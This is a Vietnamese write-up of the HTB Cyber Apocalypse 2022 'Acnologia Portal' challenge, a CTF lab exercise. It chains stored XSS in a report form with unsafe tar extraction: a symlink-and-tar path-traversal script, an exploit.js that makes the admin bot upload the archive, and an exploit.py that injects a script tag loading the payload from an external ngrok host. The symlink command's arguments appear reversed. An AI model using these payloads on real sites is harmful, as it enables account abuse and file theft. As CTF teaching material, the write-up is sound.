# HTB Cyber Apocalypse 2022 - Acnologia Portal

**Description**: Chall cho source code, một bài upload file via XSS.

*Note*: Flag nằm ở `/flag.txt`

## Review Source Code

file `blueprints/routes.py`:
```python
import json
# ........

@api.route('/login', methods=['POST'])
def user_login():
# ..........

@api.route('/register', methods=['POST'])
def user_registration():
# ........

# .....

@api.route('/firmware/report', methods=['POST'])
@login_required
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    module_id = data.get('module_id', '')
    issue = data.get('issue', '')

    if not module_id or not issue:
        return response('Missing required parameters!'), 401

    new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
    db.session.add(new_report)
    db.session.commit()

    visit_report()
    migrate_db()

    return response('Issue reported successfully!')

@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403

@web.route('/review', methods=['GET'])
@login_required
@is_admin
def review_report():
    Reports = Report.query.all()
    return render_template('review.html', reports=Reports)

```

file `util.py`:
```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

Để review source-code, về cơ bản:

1. Website có tính năng report firmware cùng với description gửi cho admin(con bot) và chỗ này dính XSS.
2. Có tính năng update firmware hay upload file nhưng chỉ admin mới có thể dùng tính năng này.
3. Nếu file được upload là 1 file tar nó sẽ được tự động extract ra thư mục chứa file.
4. File name không hề được validate và dính lỗi path traversal.


**Ý tưởng**: Bởi vì chỉ admin mới có thể upload file, ta XSS tạo code javascript có chức năng tự request đến endpoint và upload 1 file tar, cái mà sẽ được tự động extract. File tar chứa file 1 symlink với tên path traversal `../../app/application/static/css/main.css` trỏ đến `../../../../flag.txt`. 

Từ đó, ta có thể truy cập đến `/static/css/main.css`(endpoint được public nay là 1 symlink) để đọc flag.

## Exploit 

**Step 1**: Đầu tiên ta tạo 1 file symlink có tên là `payload` trỏ đến `../../../../flag.txt`
```bash
ln -s payload ../../../../flag.txt
```
**Step 2**: file `createTar.py`: tạo 1 file tar và add file symlink và đổi tên thành `../../app/application/static/css/main.css`
```python
import tarfile

tar = tarfile.open("file.tar.gz","w:gz")

tar.add('payload', '../../app/application/static/css/main.css')
tar.list()
tar.close()
```

*Tham khảo*: 

https://docs.python.org/3/library/tarfile.html

https://linuxconfig.org/how-to-create-and-manipulate-tar-archives-using-python


Giờ đây ta được `file.tar.gz` gồm 1 symlink trỏ đến flag và tên path traversal overwrite `main.css`

**Step 3**: https://www.dubget.com/file-upload-via-xss.html

Một bài upload file thông qua XSS, ta tham khảo được javascrip function `base64toBlob()` nhận đầu vào là 1 file tar được encode dạng chuỗi base64 có thể decode lại dưới format binary.

```bash
cat file.tar.gz | base64 # Ta được chuỗi base64
```

**Step 4**: Với file dưới dạng chuỗi base64, và hàm `base64toBlob()` ta build tiếp payload XSS upload file tar này khi submit cho admin.

file `exploit.js`:
```js
// <script src="https://8185-222-252-57-113.ap.ngrok.io/exploit.js"></script>

var b64file = "H4sICLe0gmIC/2ZpbGUudGFyAO3TzUrEMBSG4ay9il5BfpvGLgZm6dJbCLUzBNuxTDPQyzdlQAVRF6Mj6PtwkhOSQLL5pJJqex+Xuz4+9EfxI/TZR11rV7+u132jrbGiWsQVnOYcj+V58T/Z22rMaew3pvE2OKfbVrrQOuObG4E/T0pVKk7TOobUxZyeDqpkIqdOdfOsxpgOsiwuzH8IYe0meP22v2Te1LbW3lnrndBlbryo7Plz72s3xL3MS/7O/D/GIX1276tzAAAAAAAAAAAAAAAA4Bc8A3dU6fEAKAAA";

function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

var content_type = 'application/x-gtar-compressed';
var blob = base64toBlob(b64file, content_type);

// var file = new File([atob(base64)], "flag.tar.gz", {
//   type: "text/plain",
// });


var data = new FormData();
data.append('file', blob, 'file.tar.gz');

// LUU Y: May option nhu cors, headers... vo van co the prevent upload file.
fetch("http://localhost:1337/api/firmware/upload", {
  "body": data,
  "method": "POST"
});
```

**Step 5**: Cuối cùng file `exploit.py`, file này đơn giản là login rồi report payload XSS là 1 tag script trỏ đến file `exploit.js` ta đang host.
```python
import requests

url = 'http://134.209.177.202:31877'
s = requests.Session()

register = s.post(url+'/api/register', json={'username': '1', 'password': '1'})
login = s.post(url+'/api/login', json={'username': '1', 'password': '1'})

payload = '<script src="https://8185-222-252-57-113.ap.ngrok.io/exploit.js"></script>'
report = s.post(url+'/api/firmware/report', json={'module_id': '1', 'issue': payload})

print(report.text)
```

Chui đến: `http://ip:port/static/css/main.css` ta được flag

![Acnologia_Portal_flag](https://user-images.githubusercontent.com/71699412/169696076-bffde5d0-7827-4a17-9633-61ccf0c1752e.jpg)

**flag**: `HTB{des3r1aliz3_4ll_th3_th1ngs}`

Attemp upload `__init__.py` để RCE luôn nhưng bất thành: https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution
